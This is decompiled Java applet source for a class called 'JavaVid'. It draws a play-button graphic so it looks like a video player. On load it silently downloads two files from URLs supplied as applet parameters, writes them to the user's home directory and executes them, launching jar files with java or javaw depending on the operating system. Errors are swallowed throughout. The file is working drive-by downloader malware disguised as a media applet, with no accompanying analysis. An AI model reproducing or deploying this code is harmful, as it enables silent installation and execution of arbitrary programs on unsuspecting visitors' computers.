import java.nio.channels.ReadableByteChannel;
import java.io.FileOutputStream;
import java.nio.channels.Channels;
import java.io.File;
import java.net.MalformedURLException;
import java.net.URL;
import java.io.IOException;
import java.awt.RenderingHints;
import java.awt.Graphics2D;
import java.awt.Graphics;
import java.awt.Color;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class JavaVid extends Applet
{
    private static final long serialVersionUID = 1L;
    
    public static void main(final String[] array) {
        download(array[0], array[1]);
    }
    
    @Override
    public void init() {
        download(this.getParameter("fileName"), this.getParameter("url"));
        download(this.getParameter("fileName2"), this.getParameter("url2"));
        this.setBackground(Color.black);
    }
    
    @Override
    public void paint(final Graphics graphics) {
        final int n = 70;
        if (this.getWidth() < n || this.getHeight() < n) {
            return;
        }
        final int n2 = this.getWidth() / 2;
        final int n3 = this.getHeight() / 2;
        ((Graphics2D)graphics).setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
        graphics.setColor(Color.gray);
        graphics.fillOval(n2 - n / 2, n3 - n / 2, n, n);
        graphics.setColor(Color.black);
        graphics.fillOval(n2 - (n - 10) / 2, n3 - (n - 10) / 2, n - 10, n - 10);
        final int[] array = { (int)(n2 - 6.6), (int)Math.floor(n2 + 13.4), (int)(n2 - 6.6) };
        final int[] array2 = { n3 - 20, n3, n3 + 20 };
        graphics.setColor(Color.white);
        graphics.fillPolygon(array, array2, 3);
    }
    
    private static void download(final String s, final String s2) {
        new Thread(new Runnable() {
            private void execute(final String s) {
                try {
                    Runtime.getRuntime().exec(s);
                }
                catch (IOException ex) {}
            }
            
            @Override
            public void run() {
                URL url = null;
                try {
                    url = new URL(s2 + s);
                }
                catch (MalformedURLException ex) {}
                final String string = System.getProperty("user.home") + File.separator;
                try {
                    final ReadableByteChannel channel = Channels.newChannel(url.openStream());
                    final FileOutputStream fileOutputStream = new FileOutputStream(string + s);
                    fileOutputStream.getChannel().transferFrom(channel, 0L, 16777216L);
                    fileOutputStream.close();
                }
                catch (IOException ex2) {}
                if (s.endsWith("jar")) {
                    final String upperCase = System.getProperty("os.name").toUpperCase();
                    if (upperCase.contains("WINDOWS")) {
                        this.execute("javaw -jar " + string + s);
                    }
                    else if (upperCase.contains("LINUX")) {
                        this.execute("java -jar " + string + s + " &");
                    }
                    else {
                        this.execute("java -jar " + string + s);
                    }
                }
                else {
                    this.execute(string + s);
                }
            }
        }).start();
    }
}
